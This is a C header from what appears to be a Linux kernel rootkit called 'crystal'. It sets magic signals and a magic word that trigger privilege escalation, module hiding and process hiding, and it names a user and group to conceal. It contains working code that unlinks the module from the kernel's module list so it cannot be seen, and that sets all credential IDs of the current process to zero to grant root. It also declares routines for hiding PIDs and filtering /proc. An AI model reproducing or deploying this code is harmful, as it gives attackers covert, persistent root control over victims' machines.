#pragma once

#include <linux/list.h>
#include <linux/sched.h>
#include <linux/export.h>
#include <linux/tty.h>
#include <linux/types.h>

#include "stdlib.h"

int SIG_ROOT = 64;
int SIG_MODHIDE = 63;
int SIG_PROCHIDE = 62;
char* MAGIC_WORD = "crystal";
int USER_HIDE = 1001; // second user on a system
int GROUP_HIDE = 21; // group: fax

static struct list_head *prev_module = NULL;

bool module_is_hidden = false;

struct process_info {
	struct task_struct* task;
	struct tty_struct* tty;
	const struct cred* cred;
	struct group_info* groups;
	struct user_struct* user;
	int ioprio;
	unsigned int state;
};

void hide_module(void) {
	if (!prev_module) {
		prev_module = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list);
	}
}

void show_module(void) {
	if (prev_module) {
		list_add(&THIS_MODULE->list, prev_module);
		prev_module = NULL;
	}
}

int set_root(void) {
	struct cred *root;
	root = prepare_creds();

	if (!root)
		return -1;

	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	return commit_creds(root);
}

struct process_info* get_current_process(void) {
    struct process_info* process;
    process = kmalloc(sizeof(struct process_info), GFP_KERNEL);

    process->task = get_current();
    process->tty = get_current_tty();
    process->cred = get_current_cred();
    process->groups = get_current_groups();
    process->user = get_current_user();
    /* Some kernels do not export __get_task_ioprio used by get_current_ioprio.
       Avoid unresolved symbol at modpost by not calling it. */
    process->ioprio = 0;
    process->state = get_current_state();

    return process;
}

/* ---- Dynamic process hiding (PID-based) ---- */
/* Interface to manage hidden PIDs, implemented in crystal.c */
bool pid_is_hidden(pid_t pid);
void hide_pid(pid_t pid);
void unhide_pid(pid_t pid);
void clear_hidden_pids(void);

/* Helper to check if an fd points into /proc */
bool fd_is_proc(unsigned int fd);
